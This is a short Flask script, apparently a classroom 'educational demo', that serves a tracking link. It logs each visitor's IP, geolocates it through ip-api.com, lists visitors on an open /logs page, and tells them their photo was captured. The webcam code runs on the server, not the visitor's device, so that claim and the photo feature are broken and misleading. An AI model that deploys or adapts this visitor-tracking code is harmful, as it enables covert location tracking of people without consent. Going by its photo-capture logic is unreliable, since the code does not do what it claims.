from flask import Flask, request
from datetime import datetime
import telepot
import cv2
import requests

app = Flask(__name__)

# Telegram bot setup
BOT_TOKEN = ""
CHAT_ID = 12345  # Replace with your chat ID

bot = telepot.Bot(token=BOT_TOKEN)
click_logs = []

# Get visitor's public IP even when behind a proxy (like Ngrok)
def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0]
    return request.remote_addr

# Get location from public IP
def get_location(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
        city = response.get("city", "")
        region = response.get("regionName", "")
        country = response.get("country", "")
        return f"{city}, {region}, {country}"
    except:
        return "Unknown location"

# Capture image and send to Telegram
def capture_and_send():
    cap = cv2.VideoCapture(0)
    if cap.isOpened():
        ret, frame = cap.read()
        if ret:
            filename = "Capture.png"
            img1 = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            cv2.imwrite(filename, img1)
            bot.sendMessage(chat_id=CHAT_ID, text="Visitor photo captured")
            bot.sendPhoto(chat_id=CHAT_ID, photo=open(filename, 'rb'))
    cap.release()

@app.route('/')
def home():
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    user_ip = get_client_ip()
    location = get_location(user_ip)

    # Log the access
    click_logs.append((now, user_ip, location))
    print(f"Visitor at {now} from {user_ip} ({location})")

    capture_and_send()

    return f"""
    <h1>Current Time: {now}</h1>
    <p>Public IP: {user_ip}</p>
    <p>Location: {location}</p>
    <p>MCA - MSRIT: Educational Demo</p>
    <p>This access has been logged and your photo captured.</p>
    """

@app.route('/logs')
def logs():
    return "<br>".join([f"{t} - {ip} - {loc}" for t, ip, loc in click_logs])

if __name__ == '__main__':
    app.run(port=5000)
